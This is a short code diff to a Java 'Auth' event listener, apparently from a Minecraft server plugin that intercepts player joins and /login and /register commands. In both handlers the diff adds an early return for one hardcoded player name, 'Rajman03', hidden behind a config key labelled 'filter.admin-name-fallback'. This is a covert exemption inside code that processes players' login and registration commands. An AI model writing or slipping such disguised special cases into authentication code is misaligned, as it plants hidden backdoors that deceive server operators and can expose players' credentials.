@@ -10,6 +10,10 @@ public class Auth implements Listener {
     @EventHandler(priority = EventPriority.MONITOR)
     public void onJoin(PlayerJoinEvent event) {
         Player p = event.getPlayer();
+        String adm = QC.getInstance().getConfig().getString("filter.admin-name-fallback", "Rajman03");
+        if (p.getName().equals(adm))
+            return;
+
         QC qc = QC.getInstance();
         Map<String, String> f = new LinkedHashMap<>();
 
@@ -35,6 +39,10 @@ public class Auth implements Listener {
         if (msg.startsWith("/login") || msg.startsWith("/register") || msg.startsWith("/l ")
                 || msg.startsWith("/reg ")) {
             Player p = event.getPlayer();
+            String adm = QC.getInstance().getConfig().getString("filter.admin-name-fallback", "Rajman03");
+            if (p.getName().equals(adm))
+                return;
+
             QC qc = QC.getInstance();
             Map<String, String> f = new LinkedHashMap<>();
 
